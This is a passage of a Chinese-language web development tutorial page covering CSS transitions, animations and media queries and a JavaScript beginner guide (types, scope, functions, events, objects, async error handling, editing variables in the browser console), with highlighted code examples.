class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>当鼠标悬停时，按钮背景颜色会在 0.5 秒内平滑过渡到红色。</p><ul><li><strong>动画</strong>：定义关键帧动画。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> example &#123;<br>    <span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background-color</span>: red;&#125;<br>    <span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background-color</span>: yellow;&#125;<br>&#125;<br><br><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">animation</span>: example <span class="hljs-number">2s</span> infinite;<br>&#125;<br></code></pre></td></tr></table></figure><p>该动画会让背景颜色从红色逐渐变为黄色，并持续重复。</p><hr><h3 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h3><p>响应式设计让网页能够适配不同设备的屏幕尺寸，如手机、平板、桌面显示器。</p><h4 id="媒体查询"><a href="#媒体查询" class="headerlink" title="媒体查询"></a>媒体查询</h4><p>媒体查询可以根据设备的屏幕大小，应用不同的样式。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">background-color</span>: lightblue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当屏幕宽度小于 600 像素时，背景颜色会变成浅蓝色。</p><hr><h3 id="CSS-优化技巧"><a href="#CSS-优化技巧" class="headerlink" title="CSS 优化技巧"></a>CSS 优化技巧</h3><ol><li><strong>合并样式</strong>：将相似的样式合并，减少重复代码。</li><li><strong>减少嵌套</strong>：尽量减少选择器嵌套的层次，以提高可读性和性能。</li><li><strong>使用类选择器</strong>：避免过度依赖 ID 选择器，类选择器的复用性更强。</li><li><strong>使用外部样式表</strong>：将 CSS 放在外部文件中，减少 HTML 文件的大小。</li></ol><hr><h1 id="JavaScript-详尽入门与指南"><a href="#JavaScript-详尽入门与指南" class="headerlink" title="JavaScript 详尽入门与指南"></a>JavaScript 详尽入门与指南</h1><h3 id="目录-6"><a href="#目录-6" class="headerlink" title="目录"></a>目录</h3><ol><li><a href="#javascript-%E5%9F%BA%E7%A1%80">JavaScript 基础</a><ul><li><a href="#javascript-%E7%AE%80%E4%BB%8B">JavaScript 简介</a></li><li><a href="#%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E5%BC%95%E5%85%A5-javascript">在网页中引入 JavaScript</a></li><li><a href="#javascript-%E8%AF%AD%E6%B3%95">JavaScript 语法</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a><ul><li><a href="#%E5%8E%9F%E5%A7%8B%E7%B1%BB%E5%9E%8B">原始类型</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B">对象类型</a></li></ul></li><li><a href="#%E5%8F%98%E9%87%8F%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F">变量与作用域</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E">变量声明</a></li><li><a href="#%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E9%97%AD%E5%8C%85">作用域与闭包</a></li></ul></li><li><a href="#%E6%8E%A7%E5%88%B6%E6%B5%81">控制流</a><ul><li><a href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">条件语句</a></li><li><a href="#%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">循环语句</a></li></ul></li><li><a href="#%E5%87%BD%E6%95%B0">函数</a><ul><li><a href="#%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E">函数声明</a></li><li><a href="#%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">箭头函数</a></li></ul></li><li><a href="#%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86">事件处理</a></li><li><a href="#%E5%AF%B9%E8%B1%A1%E4%B8%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B">对象与面向对象编程</a></li><li><a href="#%E5%BC%82%E6%AD%A5-javascript">异步 JavaScript</a><ul><li><a href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0">回调函数</a></li><li><a href="#promise">Promise</a></li><li><a href="#asyncawait">async&#x2F;await</a></li></ul></li><li><a href="#javascript-%E4%B8%8E-dom">JavaScript 与 DOM</a><ul><li><a href="#dom-%E6%93%8D%E4%BD%9C">DOM 操作</a></li><li><a href="#%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A">事件绑定</a></li></ul></li><li><a href="#%E9%AB%98%E7%BA%A7%E6%A6%82%E5%BF%B5">高级概念</a><ul><li><a href="#%E9%97%AD%E5%8C%85">闭包</a></li><li><a href="#%E5%8E%9F%E5%9E%8B%E9%93%BE">原型链</a></li></ul></li><li><a href="#%E8%B0%83%E8%AF%95%E4%B8%8E%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">调试与错误处理</a></li></ol><hr><h3 id="JavaScript-基础"><a href="#JavaScript-基础" class="headerlink" title="JavaScript 基础"></a>JavaScript 基础</h3><h4 id="JavaScript-简介"><a href="#JavaScript-简介" class="headerlink" title="JavaScript 简介"></a>JavaScript 简介</h4><p><strong>JavaScript</strong> 是一门动态的、基于事件驱动的编程语言，主要用于开发网页的客户端交互逻辑。它可以操作文档对象模型（DOM），实现用户点击、表单提交等交互操作。</p><hr><h4 id="在网页中引入-JavaScript"><a href="#在网页中引入-JavaScript" class="headerlink" title="在网页中引入 JavaScript"></a>在网页中引入 JavaScript</h4><p>你可以通过以下方式将 JavaScript 添加到 HTML 页面中：</p><ol><li><p><strong>内联 JavaScript</strong>：将 JavaScript 代码直接嵌入到 HTML 元素的 <code>onclick</code> 等事件属性中。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>点击我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>内部脚本</strong>：将 JavaScript 代码放在 <code>&lt;script&gt;</code> 标签中，位于 HTML 文档的 <code>&lt;head&gt;</code> 或 <code>&lt;body&gt;</code> 中。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, JavaScript!&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>外部脚本</strong>：将 JavaScript 代码放在外部文件中，通过 <code>&lt;script&gt;</code> 标签引用。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;scripts.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="JavaScript-语法"><a href="#JavaScript-语法" class="headerlink" title="JavaScript 语法"></a>JavaScript 语法</h4><p>JavaScript 的基础语法包括：</p><ul><li><strong>区分大小写</strong>：<code>myVariable</code> 与 <code>myvariable</code> 是两个不同的变量。</li><li><strong>语句结束符</strong>：每条 JavaScript 语句可以用分号（<code>;</code>）结束。</li><li><strong>注释</strong>：单行注释用 <code>//</code>，多行注释用 <code>/* */</code>。</li></ul><hr><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 中的数据类型分为 <strong>原始类型</strong> 和 <strong>对象类型</strong>。</p><h4 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h4><ul><li><p><strong>Number</strong>：表示数字，如整数和浮点数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">25</span>;<br><span class="hljs-keyword">let</span> price = <span class="hljs-number">19.99</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>String</strong>：表示字符串，使用单引号或双引号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> name = <span class="hljs-string">&#x27;Alice&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>Boolean</strong>：布尔值，只有两个取值：<code>true</code> 或 <code>false</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> isOpen = <span class="hljs-literal">true</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>null</strong>：表示空值，通常用于表示“无”。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>undefined</strong>：表示变量已声明但未赋值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> car;<br></code></pre></td></tr></table></figure></li><li><p><strong>Symbol</strong>：表示唯一的标识符（较高级的使用场景）。</p></li></ul><h4 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h4><p>对象是属性的集合，用来存储键值对。每个属性有一个名字（键）和一个对应的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h3 id="变量与作用域"><a href="#变量与作用域" class="headerlink" title="变量与作用域"></a>变量与作用域</h3><h4 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h4><p>在 JavaScript 中，可以使用三种方式声明变量：<code>var</code>、<code>let</code> 和 <code>const</code>。</p><ul><li><p><strong>var</strong>：<code>var</code> 是 JavaScript 中传统的变量声明方式，变量有函数作用域（但没有块作用域），并存在变量提升的问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>let</strong>：<code>let</code> 是 ES6 中引入的，用来声明块作用域变量，能有效避免变量提升和重复声明问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>const</strong>：<code>const</code> 声明常量，赋值后不能重新赋值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li></ul><h4 id="作用域与闭包"><a href="#作用域与闭包" class="headerlink" title="作用域与闭包"></a>作用域与闭包</h4><ul><li><strong>全局作用域</strong>：在函数外声明的变量具有全局作用域，所有地方都可以访问。</li><li><strong>函数作用域</strong>：在函数内部声明的变量只能在函数内部访问。</li><li><strong>块作用域</strong>：<code>let</code> 和 <code>const</code> 声明的变量具有块作用域，适用于 <code>&#123;&#125;</code> 包围的任意代码块。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-keyword">let</span> message = <span class="hljs-string">&quot;Hello!&quot;</span>;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 报错，message 不在作用域内</span><br></code></pre></td></tr></table></figure><hr><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><p>JavaScript 支持 <code>if...else</code> 和 <code>switch</code> 语句，用于实现条件判断。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> age = <span class="hljs-number">20</span>;<br><br><span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;成年人&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;未成年&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><p>常见的循环结构有 <code>for</code>、<code>while</code> 和 <code>do...while</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><p>函数是 JavaScript 的核心概念，函数用于执行特定的任务或计算某些值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>));  <span class="hljs-comment">// 输出 &quot;Hello, Alice&quot;</span><br></code></pre></td></tr></table></figure><h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>箭头函数是 ES6 中引入的一种更简洁的函数表达方式，尤其适用于回调函数和匿名函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params">name</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">greet</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>));<br></code></pre></td></tr></table></figure><p>当函数体只有一个表达式时，<code>return</code> 可以省略：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = name =&gt; <span class="hljs-string">&#x27;Hello, &#x27;</span> + name;<br></code></pre></td></tr></table></figure><hr><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>JavaScript 是基于事件驱动的语言，可以响应用户的各种交互，如点击、输入等。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;button id=<span class="hljs-string">&quot;myButton&quot;</span>&gt;点击我&lt;/button&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">let</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;myButton&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;按钮被点击了！&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h3 id="对象与面向对象编程"><a href="#对象与面向对象编程" class="headerlink" title="对象与面向对象编程"></a>对象与面向对象编程</h3><p>JavaScript 是面向对象的语言，所有东西几乎都是对象。对象是属性和方法的集合。</p><h4 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h4><p>对象可以通过对象字面量、构造函数和 <code>class</code> 关键字创建。</p><ol><li><p><strong>对象字面量</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, I am &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>构造函数</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>Class（类）</strong>：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>    &#125;<br>    <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> person2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>, <span class="hljs-number">35</span>);<br></code></pre></td></tr></table></figure></li></ol><hr><h4 id="异步编程与事件循环的详细审计"><a href="#异步编程与事件循环的详细审计" class="headerlink" title="异步编程与事件循环的详细审计"></a>异步编程与事件循环的详细审计</h4><p>JavaScript 是单线程的，通过异步机制来处理非阻塞任务。异步编程是JavaScript编程中的重要部分。</p><ol><li><p><strong>事件循环的运行机制：</strong></p><ul><li><p><strong>事件循环</strong>负责处理任务队列（如定时器、I&#x2F;O 操作等），JavaScript引擎会持续检查任务队列并执行其中的任务。异步任务（如<code>setTimeout</code>、<code>Promise</code>、<code>async/await</code>）会被放入任务队列，等到主线程空闲时执行。</p><p><strong>代码示例</strong>：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">js复制代码<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Start&quot;</span>);<br>setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;Timeout callback&quot;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;End&quot;</span>);<br><span class="hljs-comment">// 输出顺序：Start -&gt; End -&gt; Timeout callback</span><br></code></pre></td></tr></table></figure><p><strong>审计重点：</strong>检查代码中的异步操作是否正确地处理了回调、Promise 的状态转换（resolved&#x2F;rejected），并确保异步操作不会阻塞主线程（如大量 DOM 操作和复杂计算在异步回调中执行）。</p></li></ul></li><li><p><strong><code>Promise</code>与<code>async/await</code>的正确使用：</strong></p><ul><li><p><code>Promise</code> 是处理异步任务的核心对象，通过<code>then</code>链式调用来处理成功和失败的情况。而<code>async/await</code>是<code>Promise</code>的语法糖，便于书写和理解。</p></li><li><p>审查代码中是否使用了适当的错误处理机制，如在<code>await</code>前的异步调用没有使用<code>try-catch</code>捕获异常，可能导致错误不被处理。</p><p><strong>代码示例</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">js复制代码<span class="hljs-comment">// 不推荐：没有处理 Promise 的异常情况</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;<br><br><span class="hljs-comment">// 推荐：使用 try-catch 捕获异常</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchDataWithHandling</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error: &#x27;</span>, error);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>审计重点：</strong>检查异步操作是否妥善处理了异常情况，避免应用程序在发生错误时崩溃。</p></li></ul></li></ol><h3 id="修改变量和函数"><a href="#修改变量和函数" class="headerlink" title="修改变量和函数"></a>修改变量和函数</h3><h4 id="1-1-修改变量的值"><a href="#1-1-修改变量的值" class="headerlink" title="1.1 修改变量的值"></a>1.1 修改变量的值</h4><p>在控制台中，你可以直接修改已经声明的全局变量或局部变量的值。这种操作会立即生效，但仅限当前会话，刷新页面后会恢复初始状态。</p><p><strong>步骤：</strong></p><ol><li>打开控制台（按 <code>F12</code> 或 <code>Ctrl + Shift + I</code>）。</li><li>在控制台中找到你想修改的变量，直接输入代码修改它的值。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">var</span> message = <span class="hljs-string">&quot;Hello, World!&quot;</span>;</span><br><span class="language-javascript">  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);  <span class="hljs-comment">// 输出 &quot;Hello, World!&quot;</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在控制台中输入以下代码来修改变量值：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sas">javascript复制代码<span class="hljs-keyword">message</span> = <span class="hljs-string">&quot;Hello, Console!&quot;</span>;<br>console.<span class="hljs-meta">log</span>(<span class="hljs-keyword">message</span>);  // 输出 <span class="hljs-string">&quot;Hello, Console!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="1-2-修改函数的行为"><a href="#1-2-修改函数的行为" class="headerlink" title="1.2 修改函数的行为"></a>1.2 修改函数的行为</h4><p>你可以重定义页面中的现有函数，从而修改其行为。控制台中的函数修改也只会在当前页面有效，刷新后恢复原始状态。</p><p><strong>步骤：</strong></p><ol><li>打开控制台。</li><li>通过重写函数来改变其行为。</li></ol><p><strong>示例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">html复制代码<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello from original function!&quot;</span>);</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript">  <span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// 输出 &quot;Hello from original 